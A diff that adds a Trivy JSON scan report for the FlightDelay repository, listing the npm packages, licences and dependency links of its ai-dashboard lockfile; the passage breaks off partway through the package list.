@@ -1,0 +1,3808 @@
+{
+  "SchemaVersion": 2,
+  "Trivy": {
+    "Version": "0.70.0"
+  },
+  "ReportID": "019fc71d-e0d1-79c4-825a-2df5d6f22262",
+  "CreatedAt": "2026-08-03T10:14:11.921645223Z",
+  "ArtifactID": "sha256:06c2f343f01969511c8691182788198f39b9ffd24209f26eab0a3dbb9de6f40a",
+  "ArtifactName": "/workspace",
+  "ArtifactType": "repository",
+  "Metadata": {
+    "RepoURL": "git@github.com:Mehdi-BenZaied/FlightDelay.git",
+    "Branch": "main",
+    "Commit": "c544df0cd9d48e66b7de62f96a95456df4805c95",
+    "CommitMsg": "Add retry mechanism for pulling Trivy image",
+    "Author": "Mehdi Ben Zaied \u003c96632580+Mehdi-BenZaied@users.noreply.github.com\u003e",
+    "Committer": "GitHub \u003cnoreply@github.com\u003e"
+  },
+  "Results": [
+    {
+      "Target": "ai-dashboard/package-lock.json",
+      "Class": "lang-pkgs",
+      "Type": "npm",
+      "Packages": [
+        {
+          "ID": "@cloudflare/workers-types@4.20260702.1",
+          "Name": "@cloudflare/workers-types",
+          "Identifier": {
+            "PURL": "pkg:npm/%40cloudflare/workers-types@4.20260702.1",
+            "UID": "468580676e27ac27"
+          },
+          "Version": "4.20260702.1",
+          "Licenses": [
+            "MIT OR Apache-2.0"
+          ],
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 422,
+              "EndLine": 428
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "drizzle-orm@0.45.2",
+          "Name": "drizzle-orm",
+          "Identifier": {
+            "PURL": "pkg:npm/drizzle-orm@0.45.2",
+            "UID": "bff9d2a5955f1b03"
+          },
+          "Version": "0.45.2",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "@cloudflare/workers-types@4.20260702.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 5346,
+              "EndLine": 5470
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "lucide-react@1.28.0",
+          "Name": "lucide-react",
+          "Identifier": {
+            "PURL": "pkg:npm/lucide-react@1.28.0",
+            "UID": "44ba06f27a582f5a"
+          },
+          "Version": "1.28.0",
+          "Licenses": [
+            "ISC"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "react@19.2.6"
+          ],
+          "Locations": [
+            {
+              "StartLine": 7766,
+              "EndLine": 7774
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "next@16.2.6",
+          "Name": "next",
+          "Identifier": {
+            "PURL": "pkg:npm/next@16.2.6",
+            "UID": "54bbe01c9a3c41b6"
+          },
+          "Version": "16.2.6",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "@next/env@16.2.6",
+            "@next/swc-darwin-arm64@16.2.6",
+            "@next/swc-darwin-x64@16.2.6",
+            "@next/swc-linux-arm64-gnu@16.2.6",
+            "@next/swc-linux-arm64-musl@16.2.6",
+            "@next/swc-linux-x64-gnu@16.2.6",
+            "@next/swc-linux-x64-musl@16.2.6",
+            "@next/swc-win32-arm64-msvc@16.2.6",
+            "@next/swc-win32-x64-msvc@16.2.6",
+            "@swc/helpers@0.5.15",
+            "baseline-browser-mapping@2.10.30",
+            "caniuse-lite@1.0.30001793",
+            "postcss@8.4.31",
+            "react-dom@19.2.6",
+            "react@19.2.6",
+            "sharp@0.34.5",
+            "styled-jsx@5.1.6"
+          ],
+          "Locations": [
+            {
+              "StartLine": 7937,
+              "EndLine": 7989
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "react@19.2.6",
+          "Name": "react",
+          "Identifier": {
+            "PURL": "pkg:npm/react@19.2.6",
+            "UID": "fb158dc9e4386d2f"
+          },
+          "Version": "19.2.6",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 8425,
+              "EndLine": 8433
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "react-dom@19.2.6",
+          "Name": "react-dom",
+          "Identifier": {
+            "PURL": "pkg:npm/react-dom@19.2.6",
+            "UID": "b671e133b2d9ef20"
+          },
+          "Version": "19.2.6",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "react@19.2.6",
+            "scheduler@0.27.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 8434,
+              "EndLine": 8445
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@emnapi/runtime@1.10.0",
+          "Name": "@emnapi/runtime",
+          "Identifier": {
+            "PURL": "pkg:npm/%40emnapi/runtime@1.10.0",
+            "UID": "a8ca5916ea821a4e"
+          },
+          "Version": "1.10.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "tslib@2.8.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 472,
+              "EndLine": 481
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/colour@1.1.0",
+          "Name": "@img/colour",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/colour@1.1.0",
+            "UID": "b31aace240fd7994"
+          },
+          "Version": "1.1.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1581,
+              "EndLine": 1590
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-darwin-arm64@0.34.5",
+          "Name": "@img/sharp-darwin-arm64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-darwin-arm64@0.34.5",
+            "UID": "68b574f446f326c7"
+          },
+          "Version": "0.34.5",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@img/sharp-libvips-darwin-arm64@1.2.4"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1591,
+              "EndLine": 1612
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-darwin-x64@0.34.5",
+          "Name": "@img/sharp-darwin-x64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-darwin-x64@0.34.5",
+            "UID": "6d9be036eb163ab9"
+          },
+          "Version": "0.34.5",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@img/sharp-libvips-darwin-x64@1.2.4"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1613,
+              "EndLine": 1634
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-libvips-darwin-arm64@1.2.4",
+          "Name": "@img/sharp-libvips-darwin-arm64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-libvips-darwin-arm64@1.2.4",
+            "UID": "c2ef2a60cc14cd5b"
+          },
+          "Version": "1.2.4",
+          "Licenses": [
+            "LGPL-3.0-or-later"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1635,
+              "EndLine": 1650
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-libvips-darwin-x64@1.2.4",
+          "Name": "@img/sharp-libvips-darwin-x64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-libvips-darwin-x64@1.2.4",
+            "UID": "58c21fde8558b171"
+          },
+          "Version": "1.2.4",
+          "Licenses": [
+            "LGPL-3.0-or-later"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1651,
+              "EndLine": 1666
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-libvips-linux-arm@1.2.4",
+          "Name": "@img/sharp-libvips-linux-arm",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-libvips-linux-arm@1.2.4",
+            "UID": "a2785ea4db687904"
+          },
+          "Version": "1.2.4",
+          "Licenses": [
+            "LGPL-3.0-or-later"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1667,
+              "EndLine": 1682
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-libvips-linux-arm64@1.2.4",
+          "Name": "@img/sharp-libvips-linux-arm64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-libvips-linux-arm64@1.2.4",
+            "UID": "58aac81bdeb22353"
+          },
+          "Version": "1.2.4",
+          "Licenses": [
+            "LGPL-3.0-or-later"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1683,
+              "EndLine": 1698
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-libvips-linux-ppc64@1.2.4",
+          "Name": "@img/sharp-libvips-linux-ppc64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-libvips-linux-ppc64@1.2.4",
+            "UID": "a1e4e37268fc5d74"
+          },
+          "Version": "1.2.4",
+          "Licenses": [
+            "LGPL-3.0-or-later"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1699,
+              "EndLine": 1714
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-libvips-linux-riscv64@1.2.4",
+          "Name": "@img/sharp-libvips-linux-riscv64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-libvips-linux-riscv64@1.2.4",
+            "UID": "8336755cbb761ddf"
+          },
+          "Version": "1.2.4",
+          "Licenses": [
+            "LGPL-3.0-or-later"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1715,
+              "EndLine": 1730
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-libvips-linux-s390x@1.2.4",
+          "Name": "@img/sharp-libvips-linux-s390x",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-libvips-linux-s390x@1.2.4",
+            "UID": "8a7bc021eee0a516"
+          },
+          "Version": "1.2.4",
+          "Licenses": [
+            "LGPL-3.0-or-later"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1731,
+              "EndLine": 1746
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-libvips-linux-x64@1.2.4",
+          "Name": "@img/sharp-libvips-linux-x64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-libvips-linux-x64@1.2.4",
+            "UID": "9b676e6d04863239"
+          },
+          "Version": "1.2.4",
+          "Licenses": [
+            "LGPL-3.0-or-later"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1747,
+              "EndLine": 1762
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-libvips-linuxmusl-arm64@1.2.4",
+          "Name": "@img/sharp-libvips-linuxmusl-arm64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-libvips-linuxmusl-arm64@1.2.4",
+            "UID": "9e70b4eedd771dfb"
+          },
+          "Version": "1.2.4",
+          "Licenses": [
+            "LGPL-3.0-or-later"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1763,
+              "EndLine": 1778
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-libvips-linuxmusl-x64@1.2.4",
+          "Name": "@img/sharp-libvips-linuxmusl-x64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-libvips-linuxmusl-x64@1.2.4",
+            "UID": "62975ce6632f7b61"
+          },
+          "Version": "1.2.4",
+          "Licenses": [
+            "LGPL-3.0-or-later"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1779,
+              "EndLine": 1794
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-linux-arm@0.34.5",
+          "Name": "@img/sharp-linux-arm",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-linux-arm@0.34.5",
+            "UID": "be2603f44d546800"
+          },
+          "Version": "0.34.5",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@img/sharp-libvips-linux-arm@1.2.4"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1795,
+              "EndLine": 1816
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-linux-arm64@0.34.5",
+          "Name": "@img/sharp-linux-arm64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-linux-arm64@0.34.5",
+            "UID": "ce79ec8b6b02b8d2"
+          },
+          "Version": "0.34.5",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@img/sharp-libvips-linux-arm64@1.2.4"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1817,
+              "EndLine": 1838
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-linux-ppc64@0.34.5",
+          "Name": "@img/sharp-linux-ppc64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-linux-ppc64@0.34.5",
+            "UID": "e3060fe9b0dc7d4e"
+          },
+          "Version": "0.34.5",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@img/sharp-libvips-linux-ppc64@1.2.4"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1839,
+              "EndLine": 1860
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-linux-riscv64@0.34.5",
+          "Name": "@img/sharp-linux-riscv64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-linux-riscv64@0.34.5",
+            "UID": "7327a94bdf9046ed"
+          },
+          "Version": "0.34.5",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@img/sharp-libvips-linux-riscv64@1.2.4"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1861,
+              "EndLine": 1882
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-linux-s390x@0.34.5",
+          "Name": "@img/sharp-linux-s390x",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-linux-s390x@0.34.5",
+            "UID": "2aa90bd2a07f7ff7"
+          },
+          "Version": "0.34.5",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@img/sharp-libvips-linux-s390x@1.2.4"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1883,
+              "EndLine": 1904
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-linux-x64@0.34.5",
+          "Name": "@img/sharp-linux-x64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-linux-x64@0.34.5",
+            "UID": "e927da5f2e4c51a4"
+          },
+          "Version": "0.34.5",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@img/sharp-libvips-linux-x64@1.2.4"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1905,
+              "EndLine": 1926
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-linuxmusl-arm64@0.34.5",
+          "Name": "@img/sharp-linuxmusl-arm64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-linuxmusl-arm64@0.34.5",
+            "UID": "4c7e6a894f5205db"
+          },
+          "Version": "0.34.5",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@img/sharp-libvips-linuxmusl-arm64@1.2.4"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1927,
+              "EndLine": 1948
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-linuxmusl-x64@0.34.5",
+          "Name": "@img/sharp-linuxmusl-x64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-linuxmusl-x64@0.34.5",
+            "UID": "9e4f0b942c40986e"
+          },
+          "Version": "0.34.5",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@img/sharp-libvips-linuxmusl-x64@1.2.4"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1949,
+              "EndLine": 1970
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-wasm32@0.34.5",
+          "Name": "@img/sharp-wasm32",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-wasm32@0.34.5",
+            "UID": "1fc13b4fbab7b0b4"
+          },
+          "Version": "0.34.5",
+          "Licenses": [
+            "Apache-2.0 AND LGPL-3.0-or-later AND MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@emnapi/runtime@1.10.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1971,
+              "EndLine": 1989
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-win32-arm64@0.34.5",
+          "Name": "@img/sharp-win32-arm64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-win32-arm64@0.34.5",
+            "UID": "eca08e9a3f618f03"
+          },
+          "Version": "0.34.5",
+          "Licenses": [
+            "Apache-2.0 AND LGPL-3.0-or-later"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1990,
+              "EndLine": 2008
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-win32-ia32@0.34.5",
+          "Name": "@img/sharp-win32-ia32",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-win32-ia32@0.34.5",
+            "UID": "8f8432a5d85cb709"
+          },
+          "Version": "0.34.5",
+          "Licenses": [
+            "Apache-2.0 AND LGPL-3.0-or-later"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2009,
+              "EndLine": 2027
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@img/sharp-win32-x64@0.34.5",
+          "Name": "@img/sharp-win32-x64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40img/sharp-win32-x64@0.34.5",
+            "UID": "79376f1148c3b9e5"
+          },
+          "Version": "0.34.5",
+          "Licenses": [
+            "Apache-2.0 AND LGPL-3.0-or-later"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2028,
+              "EndLine": 2046
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@next/env@16.2.6",
+          "Name": "@next/env",
+          "Identifier": {
+            "PURL": "pkg:npm/%40next/env@16.2.6",
+            "UID": "680fd971473e816a"
+          },
+          "Version": "16.2.6",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2122,
+              "EndLine": 2127
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@next/swc-darwin-arm64@16.2.6",
+          "Name": "@next/swc-darwin-arm64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40next/swc-darwin-arm64@16.2.6",
+            "UID": "d317995163fb53e7"
+          },
+          "Version": "16.2.6",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2138,
+              "EndLine": 2153
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@next/swc-darwin-x64@16.2.6",
+          "Name": "@next/swc-darwin-x64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40next/swc-darwin-x64@16.2.6",
+            "UID": "4848a3fb3529ca87"
+          },
+          "Version": "16.2.6",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2154,
+              "EndLine": 2169
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@next/swc-linux-arm64-gnu@16.2.6",
+          "Name": "@next/swc-linux-arm64-gnu",
+          "Identifier": {
+            "PURL": "pkg:npm/%40next/swc-linux-arm64-gnu@16.2.6",
+            "UID": "15d1eb61d07993"
+          },
+          "Version": "16.2.6",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2170,
+              "EndLine": 2185
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@next/swc-linux-arm64-musl@16.2.6",
+          "Name": "@next/swc-linux-arm64-musl",
+          "Identifier": {
+            "PURL": "pkg:npm/%40next/swc-linux-arm64-musl@16.2.6",
+            "UID": "f6d7c0c69a53ffdd"
+          },
+          "Version": "16.2.6",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2186,
+              "EndLine": 2201
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@next/swc-linux-x64-gnu@16.2.6",
+          "Name": "@next/swc-linux-x64-gnu",
+          "Identifier": {
+            "PURL": "pkg:npm/%40next/swc-linux-x64-gnu@16.2.6",
+            "UID": "3e344c81c3ea5721"
+          },
+          "Version": "16.2.6",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2202,
+              "EndLine": 2217
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@next/swc-linux-x64-musl@16.2.6",
+          "Name": "@next/swc-linux-x64-musl",
+          "Identifier": {
+            "PURL": "pkg:npm/%40next/swc-linux-x64-musl@16.2.6",
+            "UID": "e93d971848024727"
+          },
+          "Version": "16.2.6",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2218,
+              "EndLine": 2233
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@next/swc-win32-arm64-msvc@16.2.6",
+          "Name": "@next/swc-win32-arm64-msvc",
+          "Identifier": {
+            "PURL": "pkg:npm/%40next/swc-win32-arm64-msvc@16.2.6",
+            "UID": "ef9136bb9eea2f2"
+          },
+          "Version": "16.2.6",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2234,
+              "EndLine": 2249
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@next/swc-win32-x64-msvc@16.2.6",
+          "Name": "@next/swc-win32-x64-msvc",
+          "Identifier": {
+            "PURL": "pkg:npm/%40next/swc-win32-x64-msvc@16.2.6",
+            "UID": "725e71d641ac1b19"
+          },
+          "Version": "16.2.6",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2250,
+              "EndLine": 2265
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@swc/helpers@0.5.15",
+          "Name": "@swc/helpers",
+          "Identifier": {
+            "PURL": "pkg:npm/%40swc/helpers@0.5.15",
+            "UID": "fdbfcbbd55fa8d4f"
+          },
+          "Version": "0.5.15",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "tslib@2.8.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 2703,
+              "EndLine": 2711
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "baseline-browser-mapping@2.10.30",
+          "Name": "baseline-browser-mapping",
+          "Identifier": {
+            "PURL": "pkg:npm/baseline-browser-mapping@2.10.30",
+            "UID": "11944b422f52fe1a"
+          },
+          "Version": "2.10.30",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 4369,
+              "EndLine": 4380
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "caniuse-lite@1.0.30001793",
+          "Name": "caniuse-lite",
+          "Identifier": {
+            "PURL": "pkg:npm/caniuse-lite@1.0.30001793",
+            "UID": "10737b45f7558d33"
+          },
+          "Version": "1.0.30001793",
+          "Licenses": [
+            "CC-BY-4.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 4523,
+              "EndLine": 4542
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "client-only@0.0.1",
+          "Name": "client-only",
+          "Identifier": {
+            "PURL": "pkg:npm/client-only@0.0.1",
+            "UID": "12020facb1fd3a5f"
+          },
+          "Version": "0.0.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 4571,
+              "EndLine": 4576
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "detect-libc@2.1.2",
+          "Name": "detect-libc",
+          "Identifier": {
+            "PURL": "pkg:npm/detect-libc@2.1.2",
+            "UID": "38ab7fc95ab4439d"
+          },
+          "Version": "2.1.2",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 4823,
+              "EndLine": 4832
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "nanoid@3.3.12",
+          "Name": "nanoid",
+          "Identifier": {
+            "PURL": "pkg:npm/nanoid@3.3.12",
+            "UID": "c70579deac57c492"
+          },
+          "Version": "3.3.12",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 7889,
+              "EndLine": 7906
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "picocolors@1.1.1",
+          "Name": "picocolors",
+          "Identifier": {
+            "PURL": "pkg:npm/picocolors@1.1.1",
+            "UID": "60bb2597df610f95"
+          },
+          "Version": "1.1.1",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 8307,
+              "EndLine": 8312
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "postcss@8.4.31",
+          "Name": "postcss",
+          "Identifier": {
+            "PURL": "pkg:npm/postcss@8.4.31",
+            "UID": "e672f51a084801d5"
+          },
+          "Version": "8.4.31",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "nanoid@3.3.12",
+            "picocolors@1.1.1",
+            "source-map-js@1.2.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 7990,
+              "EndLine": 8017
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "scheduler@0.27.0",
+          "Name": "scheduler",
+          "Identifier": {
+            "PURL": "pkg:npm/scheduler@0.27.0",
+            "UID": "ff4fd9d513fe122"
+          },
+          "Version": "0.27.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 8719,
+              "EndLine": 8724
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "semver@7.8.0",
+          "Name": "semver",
+          "Identifier": {
+            "PURL": "pkg:npm/semver@7.8.0",
+            "UID": "1361c4220c940444"
+          },
+          "Version": "7.8.0",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 3360,
+              "EndLine": 3372
+            },
+            {
+              "StartLine": 6887,
+              "EndLine": 6899
+            },
+            {
+              "StartLine": 8890,
+              "EndLine": 8902
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "sharp@0.34.5",
+          "Name": "sharp",
+          "Identifier": {
+            "PURL": "pkg:npm/sharp@0.34.5",
+            "UID": "74c59cd05e39308b"
+          },
+          "Version": "0.34.5",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@img/colour@1.1.0",
+            "@img/sharp-darwin-arm64@0.34.5",
+            "@img/sharp-darwin-x64@0.34.5",
+            "@img/sharp-libvips-darwin-arm64@1.2.4",
+            "@img/sharp-libvips-darwin-x64@1.2.4",
+            "@img/sharp-libvips-linux-arm64@1.2.4",
+            "@img/sharp-libvips-linux-arm@1.2.4",
+            "@img/sharp-libvips-linux-ppc64@1.2.4",
+            "@img/sharp-libvips-linux-riscv64@1.2.4",
+            "@img/sharp-libvips-linux-s390x@1.2.4",
